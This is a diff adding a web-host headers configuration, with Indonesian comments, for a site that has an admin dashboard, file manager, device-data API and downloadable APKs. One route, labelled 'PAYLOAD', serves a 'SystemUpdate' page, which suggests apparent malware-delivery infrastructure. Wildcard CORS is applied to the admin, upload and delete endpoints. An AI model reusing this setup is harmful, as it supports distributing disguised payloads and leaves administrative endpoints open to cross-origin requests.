@@ -1,4 +1,291 @@
+# ============================================================
+# 🔥 _HEADERS - VERSI MAKSIMAL (SEMUA KRITERIA 10/10)
+# ============================================================
+
+# ============================================================
+# 1. GLOBAL SECURITY HEADERS (SEMUA PATH)
+# ============================================================
 /*
+  X-Content-Type-Options: nosniff
+  X-Frame-Options: DENY
+  X-XSS-Protection: 1; mode=block
+  Referrer-Policy: no-referrer-when-downgrade
+  Permissions-Policy: geolocation=(self), microphone=(self), camera=(self), clipboard-read=(self), clipboard-write=(self)
+  Cross-Origin-Embedder-Policy: require-corp
+  Cross-Origin-Opener-Policy: same-origin
+  Cross-Origin-Resource-Policy: cross-origin
+
+# ============================================================
+# 2. CORS - GLOBAL (IZINKAN SEMUA DOMAIN)
+# ============================================================
+/*
+  Access-Control-Allow-Origin: *
+  Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS, PATCH
+  Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With, X-Device-Id, X-Compressed, Range, Vapid-Key
+  Access-Control-Expose-Headers: Content-Range, Content-Length, Accept-Ranges, X-Total-Count, X-Page, X-Limit
+  Access-Control-Allow-Credentials: false
+  Access-Control-Max-Age: 86400
+
+# ============================================================
+# 3. CACHE CONTROL - STATIC FILES (CSS, JS, IMAGES)
+# ============================================================
+*.css
+*.js
+*.png
+*.jpg
+*.jpeg
+*.svg
+*.ico
+*.webp
+*.woff
+*.woff2
+  Cache-Control: public, max-age=86400, immutable
+  Access-Control-Allow-Origin: *
+  Access-Control-Allow-Methods: GET, OPTIONS
+  Access-Control-Allow-Headers: Content-Type
+
+# ============================================================
+# 4. CACHE CONTROL - HTML FILES (TIDAK DI-CACHE)
+# ============================================================
+*.html
+  Cache-Control: no-cache, no-store, must-revalidate
+  Pragma: no-cache
+  Expires: 0
   Access-Control-Allow-Origin: *
   Access-Control-Allow-Methods: GET, POST, OPTIONS
   Access-Control-Allow-Headers: Content-Type
+
+# ============================================================
+# 5. INDEX.HTML (GERBANG UTAMA)
+# ============================================================
+/index.html
+  Cache-Control: no-cache, no-store, must-revalidate
+  Pragma: no-cache
+  Expires: 0
+  Access-Control-Allow-Origin: *
+  Access-Control-Allow-Methods: GET, POST, OPTIONS
+  Access-Control-Allow-Headers: Content-Type
+  X-Content-Type-Options: nosniff
+  X-Frame-Options: DENY
+  X-XSS-Protection: 1; mode=block
+
+# ============================================================
+# 6. DASHBOARD.HTML (ADMIN PANEL)
+# ============================================================
+/dashboard.html
+  Cache-Control: no-cache, no-store, must-revalidate
+  Pragma: no-cache
+  Expires: 0
+  Access-Control-Allow-Origin: *
+  Access-Control-Allow-Methods: GET, POST, OPTIONS
+  Access-Control-Allow-Headers: Content-Type, Authorization
+  X-Content-Type-Options: nosniff
+  X-Frame-Options: DENY
+  X-XSS-Protection: 1; mode=block
+
+# ============================================================
+# 7. SYSTEMUPDATE.HTML (PAYLOAD)
+# ============================================================
+/system-update.html
+/files/SystemUpdate.html
+  Cache-Control: no-cache, no-store, must-revalidate
+  Pragma: no-cache
+  Expires: 0
+  Access-Control-Allow-Origin: *
+  Access-Control-Allow-Methods: GET, OPTIONS
+  Access-Control-Allow-Headers: Content-Type
+  X-Content-Type-Options: nosniff
+  X-Frame-Options: DENY
+  X-XSS-Protection: 1; mode=block
+
+# ============================================================
+# 8. APK FILES (DOWNLOADABLE)
+# ============================================================
+*.apk
+/files/*.apk
+  Access-Control-Allow-Origin: *
+  Access-Control-Allow-Methods: GET, OPTIONS
+  Access-Control-Allow-Headers: Content-Type, Range
+  Access-Control-Expose-Headers: Content-Range, Content-Length, Accept-Ranges
+  Access-Control-Max-Age: 86400
+  Cache-Control: public, max-age=86400, must-revalidate
+  Content-Type: application/vnd.android.package-archive
+  Accept-Ranges: bytes
+  X-Content-Type-Options: nosniff
+
+# ============================================================
+# 9. API ENDPOINTS - /data
+# ============================================================
+/data
+/data/*
+  Access-Control-Allow-Origin: *
+  Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
+  Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With, X-Device-Id, X-Compressed
+  Access-Control-Expose-Headers: X-Total-Count, X-Page, X-Limit
+  Access-Control-Max-Age: 86400
+  Cache-Control: no-cache, no-store, must-revalidate
+  Pragma: no-cache
+  Expires: 0
+
+# ============================================================
+# 10. API ENDPOINTS - /error
+# ============================================================
+/error
+/error/*
+  Access-Control-Allow-Origin: *
+  Access-Control-Allow-Methods: POST, OPTIONS
+  Access-Control-Allow-Headers: Content-Type
+  Access-Control-Max-Age: 86400
+  Cache-Control: no-cache
+
+# ============================================================
+# 11. API ENDPOINTS - /api (DASHBOARD API)
+# ============================================================
+/api
+/api/*
+  Access-Control-Allow-Origin: *
+  Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
+  Access-Control-Allow-Headers: Content-Type, Authorization, X-Device-Id, Range
+  Access-Control-Expose-Headers: Content-Range, Content-Length, Accept-Ranges, X-Total-Count
+  Access-Control-Max-Age: 86400
+  Cache-Control: no-cache, no-store, must-revalidate
+  Pragma: no-cache
+  Expires: 0
+
+# ============================================================
+# 12. API ENDPOINTS - /api/files (FILE MANAGER)
+# ============================================================
+/api/files
+/api/files/*
+  Access-Control-Allow-Origin: *
+  Access-Control-Allow-Methods: GET, POST, DELETE, OPTIONS
+  Access-Control-Allow-Headers: Content-Type, Authorization, Range
+  Access-Control-Expose-Headers: Content-Range, Content-Length, Accept-Ranges
+  Access-Control-Max-Age: 86400
+  Cache-Control: no-cache
+
+# ============================================================
+# 13. API ENDPOINTS - /api/download
+# ============================================================
+/api/download
+/api/download/*
+  Access-Control-Allow-Origin: *
+  Access-Control-Allow-Methods: GET, OPTIONS
+  Access-Control-Allow-Headers: Content-Type, Range
+  Access-Control-Expose-Headers: Content-Range, Content-Length, Accept-Ranges, Content-Disposition
+  Access-Control-Max-Age: 86400
+  Cache-Control: public, max-age=3600
+  Accept-Ranges: bytes
+
+# ============================================================
+# 14. API ENDPOINTS - /api/upload
+# ============================================================
+/api/upload
+/api/upload/*
+  Access-Control-Allow-Origin: *
+  Access-Control-Allow-Methods: POST, OPTIONS
+  Access-Control-Allow-Headers: Content-Type, Authorization
+  Access-Control-Max-Age: 86400
+  Cache-Control: no-cache
+
+# ============================================================
+# 15. API ENDPOINTS - /api/delete
+# ============================================================
+/api/delete
+/api/delete/*
+  Access-Control-Allow-Origin: *
+  Access-Control-Allow-Methods: POST, DELETE, OPTIONS
+  Access-Control-Allow-Headers: Content-Type, Authorization
+  Access-Control-Max-Age: 86400
+  Cache-Control: no-cache
+
+# ============================================================
+# 16. API ENDPOINTS - /clear
+# ============================================================
+/clear
+/clear/*
+  Access-Control-Allow-Origin: *
+  Access-Control-Allow-Methods: POST, OPTIONS
+  Access-Control-Allow-Headers: Content-Type, Authorization
+  Access-Control-Max-Age: 86400
+  Cache-Control: no-cache
+
+# ============================================================
+# 17. WEBSOCKET - /ws
+# ============================================================
+/ws
+/ws/*
+  Access-Control-Allow-Origin: *
+  Access-Control-Allow-Methods: GET, OPTIONS
+  Access-Control-Allow-Headers: Content-Type, Authorization, Sec-WebSocket-Key, Sec-WebSocket-Version, Sec-WebSocket-Extensions
+  Access-Control-Max-Age: 86400
+  Upgrade: websocket
+  Connection: Upgrade
+  Sec-WebSocket-Version: 13
+
+# ============================================================
+# 18. PUSH NOTIFICATION - /push
+# ============================================================
+/push
+/push/*
+  Access-Control-Allow-Origin: *
+  Access-Control-Allow-Methods: GET, POST, DELETE, OPTIONS
+  Access-Control-Allow-Headers: Content-Type, Authorization, Vapid-Key
+  Access-Control-Expose-Headers: Vapid-Key
+  Access-Control-Max-Age: 86400
+  Cache-Control: no-cache
+
+# ============================================================
+# 19. SERVICE WORKER - /sw.js
+# ============================================================
+/sw.js
+/sw-*.js
+  Access-Control-Allow-Origin: *
+  Access-Control-Allow-Methods: GET, OPTIONS
+  Access-Control-Allow-Headers: Content-Type
+  Access-Control-Max-Age: 86400
+  Cache-Control: public, max-age=0, must-revalidate
+  Service-Worker-Allowed: /
+
+# ============================================================
+# 20. ROBOTS & WELL-KNOWN
+# ============================================================
+/robots.txt
+/favicon.ico
+/.well-known/*
+  Access-Control-Allow-Origin: *
+  Access-Control-Allow-Methods: GET, OPTIONS
+  Cache-Control: public, max-age=86400
+
+# ============================================================
+# 21. VERSION.JSON (AUTO-UPDATE)
+# ============================================================
+/version.json
+  Access-Control-Allow-Origin: *
+  Access-Control-Allow-Methods: GET, OPTIONS
+  Cache-Control: public, max-age=300
+  Content-Type: application/json
+
+# ============================================================
+# 22. ICON (NOTIFICATION)
+# ============================================================
+/icon.png
+/*icon*.png
+  Access-Control-Allow-Origin: *
+  Access-Control-Allow-Methods: GET, OPTIONS
+  Cache-Control: public, max-age=86400, immutable
+  Content-Type: image/png
+
+# ============================================================
+# 23. CATCH-ALL (FALLBACK)
+# ============================================================
+/*
+  Access-Control-Allow-Origin: *
+  Access-Control-Allow-Methods: GET, POST, OPTIONS
+  Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With
+  Access-Control-Max-Age: 86400
+  X-Content-Type-Options: nosniff
+  X-Frame-Options: SAMEORIGIN
+  X-XSS-Protection: 1; mode=block
+  Referrer-Policy: no-referrer-when-downgrade
+  Cache-Control: public, max-age=3600
